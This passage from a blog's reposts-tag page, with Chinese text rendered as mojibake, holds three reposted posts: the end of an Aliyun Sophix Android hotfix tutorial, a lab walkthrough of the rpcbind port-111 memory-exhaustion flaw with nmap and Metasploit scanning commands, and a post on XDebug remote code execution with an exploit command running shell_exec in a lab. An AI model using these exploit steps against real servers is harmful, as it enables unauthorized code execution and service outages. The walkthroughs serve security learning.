class="string">&quot;message&quot;</span>, <span class="string">&quot;æ­å–œä½ ï¼ŒæˆåŠŸæ¥æ”¶åˆ°å‘é€çš„å¹¿æ’­&quot;</span> + PatchStatus.CODE_LOAD_RELAUNCH);</span><br><span class="line">                            intent.setAction(<span class="string">&quot;å¯ä½¿ç”¨é‡å¯å¹¿æ’­é‡å¯&quot;</span>);</span><br><span class="line">                            sendBroadcast(intent);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).initialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4><span id="7æœ€åéœ€è¦æŠŠandroidmanifesté‡Œé¢çš„applicationæ”¹ä¸ºè¿™ä¸ªæ–°å¢çš„sophixstubapplicationç±»">7.æœ€åï¼Œéœ€è¦æŠŠAndroidManifesté‡Œé¢çš„applicationæ”¹ä¸ºè¿™ä¸ªæ–°å¢çš„SophixStubApplicationç±»ï¼š</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;application</span><br><span class="line">        android:name=&quot;com.my.pkg.SophixStubApplication&quot;</span><br><span class="line">        ... ...&gt;</span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·ä¾¿å®Œæˆäº†æ–°æ–¹å¼çš„åˆå§‹åŒ–æ¥å…¥æ”¹é€ ã€‚</p>
</blockquote>
<h2><span id="ä¸‰-çƒ­ä¿®å¤æ‰“å·®é‡åŒ…æµç¨‹-çƒ­ä¿®æ§åˆ¶å°åœ°å€">ä¸‰ã€çƒ­ä¿®å¤æ‰“å·®é‡åŒ…æµç¨‹ çƒ­ä¿®æ§åˆ¶å°åœ°å€</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://emas.console.aliyun.com/service/devTool/hotfix/patch">https://emas.console.aliyun.com/service/devTool/hotfix/patch</a></p>
</blockquote>
<h3><span id="31-æ‰¾åˆ°çƒ­ä¿®ç•Œé¢æ·»åŠ åº”ç”¨">3.1ã€æ‰¾åˆ°çƒ­ä¿®ç•Œé¢æ·»åŠ åº”ç”¨</span></h3><blockquote>
<p>å¦‚ä¸‹å›¾ï¼š<strong>æ³¨æ„</strong>åº”ç”¨ç‰ˆæœ¬å¿…é¡»ä¸ä½ çš„<code>versionName</code>ä¸€è‡´ï¼Œå¦åˆ™ä¼š<code>å¯¼è‡´åç»­ä¸‹å‘æŸ¥æ‰¾ä¸åˆ°å·®é‡åŒ…</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/7.png" alt="image"></p>
<p><img src="/2024/01/15/Aliyun-Sophix/8.png" alt="image"></p>
</blockquote>
<h3><span id="32-æ‰“å·®é‡åŒ…">3.2ã€æ‰“å·®é‡åŒ…</span></h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434864.html">https://help.aliyun.com/document_detail/434864.html</a></p>
<ol>
<li>å‡†å¤‡å¥½SophixPatchTool_windowsæ‰“åŒ…å·¥å…·å„ç‰ˆæœ¬æ‰“åŒ…å·¥å…·å¦‚ä¸‹:</li>
</ol>
<ul>
<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_macos.zip">Macç‰ˆæœ¬æ‰“åŒ…å·¥å…·ä¸‹è½½</a></li>
<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_windows.zip">Windowsç‰ˆæœ¬æ‰“åŒ…å·¥å…·ä¸‹è½½</a></li>
<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_linux.zip">Linuxç‰ˆæœ¬æ‰“åŒ…å·¥å…·åœ°å€</a></li>
</ul>
<ol>
<li>æ‰“ä¸€ä¸ªreleaseçš„åŒ…</li>
<li>å†ç¬¬2æ­¥çš„releaseåŒ…çš„åŸºç¡€ä¸Šä¿®æ”¹ä¸€äº›å†…å®¹ï¼Œåœ¨æ‰“ä¸€ä¸ªreleaseåŒ…</li>
<li>åˆ©ç”¨å·¥å…·å¼€å§‹æ‰“åŒ…ï¼Œå¦‚ä¸‹å›¾</li>
</ol>
<p><strong>æ³¨æ„ï¼š</strong> æ¯æ¬¡çƒ­ä¿®å·®é‡åŒ…çš„ç”Ÿæˆçš„åŸºç¡€åŒ…å°±æ˜¯ä½ ä¸Šæ¬¡å‘ç‰ˆåçš„åŒ…ï¼Œå¹¶ä¸æ˜¯è¯´ä½ åœ¨è¿›è¡Œç¬¬ä¸‰æ¬¡çƒ­ä¿®æ—¶ï¼Œç”¨ç¬¬äºŒæ¬¡çš„çƒ­ä¿®åŒ…ï¼Œä½œä¸ºåŸºå‡†åŒ…</p>
<p><code>é—®é¢˜åŒ…ï¼š1.0-querelease-2022-12-07.apkï¼Œä¿®å¤åŒ…ï¼š1.0-release-2022-12-07.apk</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/9.png" alt="image"></p>
<p><code>æ‰“å¼€å·¥å…·ï¼š</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/10.png" alt="image"></p>
<p><code>é€‰æ‹©ä¸¤ä¸ªåŒ…å¡«å……</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/11.png" alt="image"></p>
<p><code>é€‰æ‹©è®¾ç½®å¡«å¥½keystore</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/12.png" alt="image"></p>
<p><code>é€‰æ‹©é«˜çº§ï¼Œé»˜è®¤å¦‚ä¸‹å›¾ï¼Œå¼ºåˆ¶å†·å¯åŠ¨å°±æ˜¯è¡¥ä¸åŒ…ä¸‹å‘åå¿…é¡»é‡å¯ï¼Œå»ºè®®å‹¾é€‰å¼ºåˆ¶å†·å¯åŠ¨ï¼Œä¸ºä½•ï¼šçœ‹ä¸‹é¢è§£é‡Š</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/13.png" alt="image"></p>
<p><code>Sophixä½•æ—¶èµ°å³æ—¶ç”Ÿæ•ˆçƒ­ä¿®å¤ï¼Œä½•æ—¶èµ°å†·å¯åŠ¨ä¿®å¤ï¼Ÿ</code><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/53227.htm?spm=5176.2020520104.0.0.385a3f1bbai0Ta#topic-1993907">https://help.aliyun.com/document_detail/53227.htm?spm=5176.2020520104.0.0.385a3f1bbai0Ta#topic-1993907</a></p>
<p><code>é…ç½®å®Œæˆåç‚¹å‡»Goå¼€å§‹æ‰“å·®é‡åŒ…</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/14.png" alt="image"></p>
<p><code>æˆåŠŸ</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/15.png" alt="image"></p>
<p><code>sophix-patch.jar å°±æ˜¯æ‰“å‡ºçš„å·®é‡åŒ…</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/16.png" alt="image"></p>
</blockquote>
<h2><span id="å››-ä¸Šä¼ è¡¥ä¸-å‘å¸ƒ">å››ã€ä¸Šä¼ è¡¥ä¸-å‘å¸ƒ</span></h2><h3><span id="41-æ·»åŠ ä½ çš„åº”ç”¨ç‰ˆæœ¬ç„¶åä¸Šä¼ è¡¥ä¸">4.1ã€æ·»åŠ ä½ çš„åº”ç”¨ç‰ˆæœ¬ï¼Œç„¶åä¸Šä¼ è¡¥ä¸</span></h3><blockquote>
<p><img src="/2024/01/15/Aliyun-Sophix/17.png" alt="image"></p>
</blockquote>
<h3><span id="42-å‘å¸ƒè¡¥ä¸">4.2ã€å‘å¸ƒè¡¥ä¸</span></h3><blockquote>
<p><code>ä¸Šä¼ åç‚¹å‡»å‘å¸ƒå¦‚ä¸‹å›¾</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/18.png" alt="image"></p>
<p><code>ä¸‹è½½[hotfixdebug]å·¥å…·éªŒè¯ä½ çš„è¡¥ä¸åŒ…æ˜¯å¦æˆåŠŸ</code>,è°ƒè¯•æµç¨‹åŸæ–‡å¦‚ä¸‹é“¾æ¥ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434866.html">https://help.aliyun.com/document_detail/434866.html</a></p>
<p><img src="/2024/01/15/Aliyun-Sophix/19.png" alt="image"></p>
<p>è°ƒè¯•æ²¡é—®é¢˜åç‚¹å‡»ä¸Šå›¾çš„<code>æ–°å»ºå‘å¸ƒ</code></p>
<p><img src="/2024/01/15/Aliyun-Sophix/20.png" alt="image"></p>
<p>å‘å¸ƒçš„è¯ï¼šæœ‰å…¨é‡ï¼Œç°åº¦ä¸¤ç§ï¼Œ<code>ç°åº¦çš„è¯</code> ï¼Œéœ€è¦è®¾ç½®æŒ‡å®šæ ‡ç­¾<code>tag</code>ï¼Œå°±æ˜¯ä½ çš„åº”ç”¨appä¸­Sophixæ‰€é…ç½®çš„ï¼Œå¦‚ä¸‹å›¾ï¼šï¼ˆæ¨èæ˜¯å…¨é‡ï¼‰</p>
<p><img src="/2024/01/15/Aliyun-Sophix/21.png" alt="image"></p>
</blockquote>
<h3><span id="43-å‘å¸ƒæˆåŠŸååœ¨appä¸­è°ƒç”¨æŸ¥è¯¢è¡¥ä¸æ–¹æ³•">4.3ã€å‘å¸ƒæˆåŠŸååœ¨appä¸­è°ƒç”¨æŸ¥è¯¢è¡¥ä¸æ–¹æ³•</span></h3><blockquote>
<h3><span id="sophixmanagergetinstancequeryandloadnewpatch"><code>SophixManager.getInstance().queryAndLoadNewPatch()</code></span></h3><p>åç»­å°†å›è°ƒ<code>PatchLoadStatusListener</code>å¦‚ä¸‹å›¾</p>
<p><img src="/2024/01/15/Aliyun-Sophix/22.png" alt="image"></p>
<p>ä¾æ¬¡å‡ºç°çƒ­ä¿®çŠ¶æ€ç å¦‚ä¸‹ï¼ŒçŠ¶æ€ç å«ä¹‰ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434886.html?spm=a2c4g.11186623.0.0.6cdf4b0cnRYOiA">https://help.aliyun.com/document_detail/434886.html?spm=a2c4g.11186623.0.0.6cdf4b0cnRYOiA</a></p>
<p><img src="/2024/01/15/Aliyun-Sophix/23.png" alt="image"></p>
<p><img src="/2024/01/15/Aliyun-Sophix/24.png" alt="image"></p>
<p><strong>ä¸Šå›¾åŠ è½½æˆåŠŸåæç¤ºéœ€è¦é‡å¯åçƒ­ä¿®ç”Ÿæ•ˆ</strong></p>
</blockquote>
<h2><span id="äº”-æµ‹è¯•ç”¨ä¾‹">äº”ã€æµ‹è¯•ç”¨ä¾‹</span></h2><blockquote>
<p><strong>1.</strong> ä¿®æ”¹ä¸€ä¸ªtoastæ–‡æ¡ˆï¼Œç„¶åä¿®å¤æˆåŠŸã€‚</p>
<p><strong>2.</strong> ä¿®æ”¹ä¸€å¼ å›¾ç‰‡ï¼Œå¢åŠ ä¸€å¼ æ–°çš„å›¾ç‰‡è¿›è¡Œå±•ç¤ºï¼Œå¢åŠ ç‚¹å‡»æ•ˆæœï¼Œå¢åŠ ä¸€ä¸ªæ–°çš„ç±»ç”Ÿæˆæç¤ºæ–‡æ¡ˆï¼ˆmipmap-hdpiã€drawable-xhdpiã€drawableã€éƒ½æ·»åŠ å›¾ç‰‡ï¼‰</p>
<p>drawable-xhdpi ä¸­æ–°å¢çƒ­ä¿®å›¾ç‰‡æ·»åŠ å¯èƒ½ä¼šå­˜åœ¨é—®é¢˜ï¼šå¦‚ä¸‹ï¼Œç„¶åæŒ‰è¦æ±‚åœ¨drawable ä¸­æ·»åŠ åï¼Œçƒ­ä¿®æˆåŠŸã€‚</p>
<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/338384.html">https://help.aliyun.com/document_detail/338384.html</a></p>
<p><img src="/2024/01/15/Aliyun-Sophix/25.png" alt="image"></p>
<p><strong>3.</strong> æ·»åŠ assetsæ–‡ä»¶ï¼Œçƒ­ä¿®æˆåŠŸã€‚ </p>
<p><strong>4.</strong> <code>å››å¤§ç»„ä»¶ä¸è¡Œ</code>ï¼Œå› ä¸ºéœ€è¦åœ¨AndroidManifest.xmlæ–‡ä»¶ä¸­é…ç½®ï¼Œçƒ­ä¿®çš„æ—¶å€™ä½¿ç”¨çš„è¯ä¼šæŠ¥æ‰¾ä¸åˆ°çš„ï¼Œéœ€è¦æ³¨å†Œå¼‚å¸¸ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="/2024/01/15/Aliyun-Sophix/26.png" alt="image"></p>
<p><strong>5.</strong> åˆ é™¤æµ‹è¯•4ä¸­çš„ç»„ä»¶è·³è½¬æµç¨‹ï¼Œçƒ­ä¿®æµ‹è¯•æˆåŠŸï¼Œ</p>
<p><strong>6.</strong> åˆ é™¤æµ‹è¯•2ä¸­æ·»åŠ çš„xmlä¸­çš„ä»£ç ä¸ç›¸å…³èµ„æºï¼Œçƒ­ä¿®æµ‹è¯•æˆåŠŸ</p>
<p>æ³¨æ„ï¼š</p>
<p> 1.çƒ­ä¿®åŒ…å­˜åœ¨çš„è¯ï¼Œæ¯æ€æ­»appï¼Œåˆå§‹åŒ–è¿›æ¥éƒ½ä¼šèµ°</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">onLoadæ–¹æ³•çš„å›è°ƒ</span><br><span class="line"></span><br><span class="line"><span class="attr">code</span> == PatchStatus.CODE_LOAD_SUCCESS</span><br></pre></td></tr></table></figure>

<p><img src="/2024/01/15/Aliyun-Sophix/27.png" alt="image"></p>
<p>2.åŒä¸€ä¸ªçƒ­ä¿®åŒ…ï¼Œè®¾ç½®ä¸åŒçš„tagï¼Œç„¶åç‚¹å‡»ä¸‹å‘çš„è¯éƒ½ä¼šä¸‹å‘ä¸€æ¬¡</p>
<p>3.æ¸…é™¤çƒ­ä¿®åŒ…åï¼Œä¹‹å‰å‘å¸ƒçš„ç‰ˆæœ¬éƒ½æ— æ•ˆäº†ï¼Œå†æ¬¡æŸ¥è¯¢åŠ è½½ï¼Œéƒ½æŸ¥ä¸åˆ°äº†ï¼Œåªèƒ½ä¹‹ååœ¨è¿™ä¸ªç‰ˆæœ¬é‡æ–°å‘å¸ƒ</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SophixManager<span class="selector-class">.getInstance</span>()<span class="selector-class">.cleanPatches</span>()</span><br></pre></td></tr></table></figure>

<p>çƒ­ä¿®å¤ä¹¦ç±ï¼š<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/115122">https://developer.aliyun.com/article/115122</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Sophix/" rel="tag">Sophix</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2023/12/07/RPCBind-DDOS/">
                111ç«¯å£rpcbindæ¼æ´
            </a>
        </h2>
    
    <time>
        Dec 7, 2023
    </time>
    <section class="content">
        <h1><span id="111ç«¯å£rpcbindæ¼æ´">111ç«¯å£rpcbindæ¼æ´</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44110913/article/details/108852581">Mamba start</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="ç®€ä»‹">ç®€ä»‹</span></h2><blockquote>
<p>rpcbindæ˜¯NFSä¸­ç”¨æ¥è¿›è¡Œæ¶ˆæ¯é€šçŸ¥çš„æœåŠ¡</p>
</blockquote>
<h2><span id="å®éªŒç¯å¢ƒ">å®éªŒç¯å¢ƒ</span></h2><blockquote>
<p>æ”»å‡»æœºï¼š<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a> linux<br>ip:192.168.172.134<br>ç›®æ ‡æœºï¼šMetasploittable2<br>ip:192.168.172.129</p>
</blockquote>
<h2><span id="æ”»å‡»è¿‡ç¨‹">æ”»å‡»è¿‡ç¨‹</span></h2><h3><span id="step1ä½¿ç”¨nmapæ¢æµ‹">step1:ä½¿ç”¨nmapæ¢æµ‹</span></h3><blockquote>
<p>å‘½ä»¤ï¼š<code>nmap 192.168.172.129</code></p>
<p>å‘½ä»¤ï¼š<code>nmap -sV -p 111 192.168.172.129</code></p>
<p>å‘½ä»¤ï¼š<code>nmap -p 111 --script=rpcinfo 192.168.172.129</code></p>
</blockquote>
<h3><span id="step2metasploitæ¨¡å—æ¢æµ‹">step2:metasploitæ¨¡å—æ¢æµ‹</span></h3><blockquote>
<p>å¯åŠ¨msf</p>
<p>å‘½ä»¤ï¼š<code>use auxiliary/scanner/misc/sunrpc_portmapper</code></p>
<p>å‘½ä»¤ï¼š<code>show options</code></p>
<p>æœ¬æ–‡è®²çš„æ˜¯åªéœ€60å­—èŠ‚å°±å¯é€šè¿‡rpcbindè®©æœåŠ¡å™¨å´©æºƒï¼Œå…¨ä¸–ç•Œçš„äººéƒ½çŸ¥é“è¿™ç©æ„å„¿çš„ç”¨å¤„ï¼Œäººä»¬å°±è¿™ä¹ˆä»»ç”±å®ƒä¸€ç›´å¼€ç€ï¼Œæ— è¯­ã€‚æ‰€ä»¥ï¼Œè¦ä¹ˆè¡¥ä¸Šï¼Œè¦ä¹ˆå…³é—­å§ã€‚</p>
</blockquote>
<h2><span id="å†™åœ¨åé¢">å†™åœ¨åé¢</span></h2><blockquote>
<p>å‘rpcbindæœåŠ¡çš„UDPå¥—æ¥å­—å‘é€60å­—èŠ‚è½½è·ï¼Œä¾¿å¯å¡«å……ç›®æ ‡å†…å­˜ï¼Œæå´©ä¸»æœºç³»ç»Ÿã€‚<br>åœ­å¤šÂ·ä¹Œå…°è‚¯ï¼Œè¯¥æ¼æ´å‘ç°è€…å…¼â€œRpcbombâ€æ¼æ´åˆ©ç”¨ç¨‹åºå¼€å‘è€…ï¼ŒæŠ±æ€¨ç§°è¯¥è½¯ä»¶åŒ…ç»´æŠ¤è€…æ¯«æ— ååº”ï¼Œä»–ä¸å¾—ä¸è‡ªå·±å†™äº†è¡¥ä¸ã€‚</p>
<p>æ¼æ´åˆ©ç”¨&amp;è¡¥ä¸ï¼š<a target="_blank" rel="noopener" href="https://github.com/guidovranken/rpcbomb">https://github.com/guidovranken/rpcbomb</a></p>
<p>ä»–å†™é“ï¼ŒShodanæœç´¢å‘ç°ï¼Œäº’è”ç½‘ä¸Šå¼€æ”¾ rpcbind 111 ç«¯å£çš„ä¸»æœºæœ‰180ä¸‡å°ã€‚å…¶ä¸­å¤§å¤šæ•°éƒ½è¿è¡Œåœ¨AWSä¹‹ç±»å¤§è§„æ¨¡æ‰˜ç®¡ä¸Šï¼Œç”¨æˆ·æ€»æ˜¯ç›´æ¥æ²¿ç”¨Linuxå‘è¡Œç‰ˆçš„é»˜è®¤é…ç½®(111ç«¯å£å¼€æ”¾)ã€‚</p>
<p>å¦‚æœä½ çœŸçš„éœ€è¦ä½¿ç”¨rpcbindæœåŠ¡(å°†è¿œç¨‹è¿‡ç¨‹è°ƒç”¨RPCä¸åœ°å€ç»‘å®š)ï¼Œå°±æŠŠå®ƒç½®äºé˜²ç«å¢™åï¼Œé™åˆ¶111ç«¯å£å¯¹å¤–å¼€æ”¾å§ã€‚æœ€å¥½å°±æ˜¯ç›´æ¥å…³äº†ã€‚</p>
<p>GitHubä¸Šçš„è¡¥ä¸è¶³å¤Ÿå°ï¼Œå¼€å‘è€…ä»¬åº”è¯¥å¯ä»¥éªŒè¯è¿™äº›è¡¥ä¸çš„çŸ­å°ç²¾æ‚ï¼šrpcbindåªéœ€è¦ä¸¤è¡Œä»£ç å°±èƒ½ä¿®å¤ï¼Œä¸åƒlibtirpcè¦256è¡Œã€‚</p>
<p>ä¹Œå…°è‚¯ç§°ï¼Œè¯¥æ¼æ´å¯ä½¿æ”»å‡»è€…åœ¨è¿œç¨‹rpcbindç»‘å®šä¸»æœºä¸Šåˆ†é…ä»»æ„å¤§å°çš„å†…å­˜(æ¯æ¬¡æ”»å‡»æœ€é«˜å¯è¾¾4GB)ï¼Œé™¤éè¿›ç¨‹å´©æºƒï¼Œæˆ–è€…ç®¡ç†å‘˜æŒ‚èµ·&#x2F;é‡å¯rpcbindæœåŠ¡ï¼Œå¦åˆ™è¯¥å†…å­˜ä¸ä¼šè¢«é‡Šæ”¾ã€‚</p>
<p>å½“ç„¶ï¼Œé™¤äº†ä¸æ–­å ç”¨ç›®æ ‡ç³»ç»Ÿçš„å†…å­˜ï¼Œæ”»å‡»è€…è¿˜å¯ä»¥å¹²åˆ«çš„äº‹ï¼Œå› ä¸ºæœ‰äº›è½¯ä»¶åœ¨å†…å­˜åˆ†é…å¤±è´¥çš„æ—¶å€™ï¼Œæ˜¯ä¼šå‘ç”Ÿä¸å¯é¢„çŸ¥çš„é”™è¯¯çš„ã€‚</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RPCBind/" rel="tag">RPCBind</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2023/12/07/XDebug-RCE/">
                XDebug è¿œç¨‹è°ƒè¯•æ¼æ´ï¼ˆä»£ç æ‰§è¡Œï¼‰
            </a>
        </h2>
    
    <time>
        Dec 7, 2023
    </time>
    <section class="content">
        <h1><span id="xdebug-è¿œç¨‹è°ƒè¯•æ¼æ´ä»£ç æ‰§è¡Œ">XDebug è¿œç¨‹è°ƒè¯•æ¼æ´ï¼ˆä»£ç æ‰§è¡Œï¼‰</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://joker-vip.github.io/2021/12/06/XDebug%20%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89/">joker0xxx3</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h2><span id="ç®€ä»‹">ç®€ä»‹</span></h2><blockquote>
<p>XDebugæ˜¯PHPçš„ä¸€ä¸ªæ‰©å±•ï¼Œç”¨äºè°ƒè¯•PHPä»£ç ã€‚å¦‚æœç›®æ ‡å¼€å¯äº†è¿œç¨‹è°ƒè¯•æ¨¡å¼ï¼Œå¹¶è®¾ç½®<code>remote_connect_back = 1</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = <span class="number">1</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªé…ç½®ä¸‹ï¼Œæˆ‘ä»¬è®¿é—®<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>ï¼Œç›®æ ‡æœåŠ¡å™¨çš„XDebugå°†ä¼šè¿æ¥è®¿é—®è€…çš„IPï¼ˆæˆ–<code>X-Forwarded-For</code>å¤´æŒ‡å®šçš„åœ°å€ï¼‰å¹¶é€šè¿‡dbgpåè®®ä¸å…¶é€šä¿¡ï¼Œæˆ‘ä»¬é€šè¿‡dbgpä¸­æä¾›çš„evalæ–¹æ³•å³å¯åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„PHPä»£ç ã€‚</p>
<p>æ›´å¤šè¯´æ˜å¯å‚è€ƒï¼š</p>
<ul>
<li>[[<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface/]]">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface\]]</a>(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface])(<a target="_blank" rel="noopener" href="https://ricterz.me/posts/Xdebug%3A">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface)</li>
<li><a target="_blank" rel="noopener" href="https://xdebug.org/">https://xdebug.org</a></li>
</ul>
</blockquote>
<h2><span id="æ¼æ´åˆ©ç”¨">æ¼æ´åˆ©ç”¨</span></h2><blockquote>
<p>å¯åŠ¨å®Œæˆåï¼Œè®¿é—®<code>http://192.168.44.132:8080/</code>å³å¯å‘ç°ä¸»é¡µæ˜¯ä¸€ä¸ªç®€å•çš„phpinfoï¼Œåœ¨å…¶ä¸­å¯ä»¥æ‰¾åˆ°xdebugçš„é…ç½®ï¼Œå¯è§å¼€å¯äº†è¿œç¨‹è°ƒè¯•ã€‚</p>
<p><img src="/2023/12/07/XDebug-RCE/1.png" alt="image"></p>
<p>å› ä¸ºéœ€è¦ä½¿ç”¨dbgpåè®®ä¸ç›®æ ‡æœåŠ¡å™¨é€šä¿¡ï¼Œæ‰€ä»¥æ— æ³•ç”¨httpåè®®å¤ç°æ¼æ´ã€‚</p>
<p>æˆ‘ç¼–å†™äº†ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">æ¼æ´å¤ç°è„šæœ¬</a>ï¼ŒæŒ‡å®šç›®æ ‡webåœ°å€ã€å¾…æ‰§è¡Œçš„phpä»£ç å³å¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¦æ±‚ç”¨python3å¹¶å®‰è£…requestsåº“</span></span><br><span class="line">python3 exp.py -t http://192.168.44.132:8080/index.php -c <span class="string">&#x27;shell_exec(&#x27;</span><span class="built_in">id</span><span class="string">&#x27;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/07/XDebug-RCE/2.png" alt="image"></p>
<p><strong>é‡è¦è¯´æ˜ï¼šå› ä¸ºè¯¥é€šä¿¡æ˜¯ä¸€ä¸ªåå‘è¿æ¥çš„è¿‡ç¨‹ï¼Œexp.pyå¯åŠ¨åå…¶å®æ˜¯ä¼šç›‘å¬æœ¬åœ°çš„9000ç«¯å£ï¼ˆå¯é€šè¿‡-lå‚æ•°æŒ‡å®šï¼‰å¹¶ç­‰å¾…XDebugå‰æ¥è¿æ¥ï¼Œæ‰€ä»¥æ‰§è¡Œè¯¥è„šæœ¬çš„æœåŠ¡å™¨å¿…é¡»æœ‰å¤–ç½‘IPï¼ˆæˆ–è€…ä¸ç›®æ ‡æœåŠ¡å™¨å¤„äºåŒä¸€å†…ç½‘ï¼‰ã€‚</strong></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XDebug/" rel="tag">XDebug</a>
            </div>
        

    </section>
</article>
  
</section>


  <nav id="page-nav" class="clearfix">
    
    <a class="prev" rel="prev" href="/tags/Reprint/page/2/">
      <span class="icon icon-chevron-left"></span>
      <span class="text">Previous</span>
    </a>
    
    
    <a class="next" rel="next" href="/tags/Reprint/page/4/">
      <span class="text">Next</span>
      <span class="icon icon-chevron-right"></span>
    </a>
    
  </nav>

        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/szczecin" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">æ°•æ°˜æ°š</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    Szczecin
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    Open your eyes to see the light in life
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            ç®€ä»‹
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            å½’æ¡£
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/categories"
                           onfocus="this.blur();"
                           class="nav-categories dark-btn block">
                            åˆ†ç±»
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/tags"
                           onfocus="this.blur();"
                           class="nav-tags dark-btn block">
